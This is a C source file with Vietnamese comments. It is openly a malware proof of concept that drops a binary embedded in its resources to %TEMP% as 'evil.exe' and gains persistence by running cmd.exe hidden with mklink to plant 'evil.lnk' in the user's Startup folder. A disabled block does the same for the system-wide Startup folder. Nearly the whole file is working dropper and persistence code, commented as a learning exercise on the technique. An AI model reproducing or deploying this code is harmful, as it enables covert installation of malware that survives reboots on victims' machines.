#include "resource.h"
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <Windows.h>
#pragma comment(lib, "Shlwapi.lib")

//#define INFO_BUFFER_SIZE 32767

/*
** Mô tả:
** - Malware dropped tệp độc hại hoặc tệp .lnk/shortcut vào Startup folder
** - Mỗi khi máy tính khởi động lại thì cũng tự động thực thi malware
** - Một số startup folder (của hệ thống và của người dùng):
	+ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
	+ C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
** PoC:
** - Dropped tệp độc hại vào %TEMP%
** - Tạo shortcut trỏ đến tệp độc hại
** Ref:
** 1. Getting System Information - MSDN
	https://docs.microsoft.com/en-us/windows/win32/sysinfo/getting-system-information
** 2. SHGetFolderPathA function / SHGetSpecialFolderPathA function / PathAppendA function
	https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpatha
	https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetspecialfolderpatha
	https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathappenda
** 3. CSIDL - MSDN
	https://docs.microsoft.com/en-us/windows/win32/shell/csidl
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via Startup Folder ***
	/*
	** C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\
	** C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
	*/
	/*
	** Cách 1: Get thông tin username, dùng hàm wsprintfA() để định dạng lại path
	** => Username có thể chứa ký tự Unicode => Có thể kết quả sai lệch
	*/
	/*
	TCHAR	usernameBuff[INFO_BUFFER_SIZE];
	DWORD	bufCharCount = INFO_BUFFER_SIZE;
	TCHAR	userStartUp[MAX_PATH];
	TCHAR	systemStartUp[MAX_PATH] = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";

	if (!GetUserName(usernameBuff, &bufCharCount))
		printf(" [-] GetUserName Error. Code = %d\n", GetLastError());
	wsprintfA(userStartUp, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", usernameBuff);
	*/

	/*
	** Cách 2: Get Path của Startup foler theo shell hệ thống
	** => Cách này không cần quan tâm Username là gì => An toàn và có độ chính xác cao hơn.
	** Sử dụng hàm SHGetFolderPath, ta có các hằng số sau:
	** Startup folder người dùng: CSIDL_ALTSTARTUP, CSIDL_STARTUP
	** Startup folder hệ thống: CSIDL_COMMON_ALTSTARTUP, CSIDL_COMMON_STARTUP
	*/

	TCHAR		userStartUp[MAX_PATH];
	TCHAR		systemStartUp[MAX_PATH];
	LPCSTR		lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	LPSTR		lpCommandLine[1024] = { 0 };

	Sleep(500);
	printf(" [+] Setting up Persistence via Startup Folder.\n");
	
	// Create lnk user startup
	if (S_OK != SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, userStartUp)) {
		printf(" [-] Failed to get User Startup folder. Code = %d\n", GetLastError());
	}
	PathAppendA(userStartUp, TEXT("evil.lnk"));
	wsprintfA(lpCommandLine, "/C %s \"%s\" \"%s\"", "mklink", userStartUp, filePath);
	HINSTANCE status1 = ShellExecute(NULL, "open", lpApplicationName, lpCommandLine, NULL, SW_HIDE);
	if ((DWORD)status1 <= 32) {
		printf(" [-] Failed to create user startup lnk. Code = %d\n", GetLastError());
		return;
	}

#if 0
	// Create lnk system startup
	if (S_OK != SHGetFolderPath(NULL, CSIDL_COMMON_STARTUP, NULL, 0, systemStartUp)) {
		printf(" [-] Failed to get System Startup folder. Code = %d\n", GetLastError());
	}
	PathAppendA(systemStartUp, TEXT("evil.lnk"));
	ZeroMemory(lpCommandLine, 1024);
	wsprintfA(lpCommandLine, "/C %s \"%s\" \"%s\"", "mklink", systemStartUp, filePath);
	HINSTANCE status2 = ShellExecute(NULL, "open", lpApplicationName, lpCommandLine, NULL, SW_HIDE);
	if ((DWORD)status2 <= 32) {
		printf(" [-] Failed to create system startup lnk. Code = %d\n", GetLastError());
		return;
	}
#endif // 0

	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}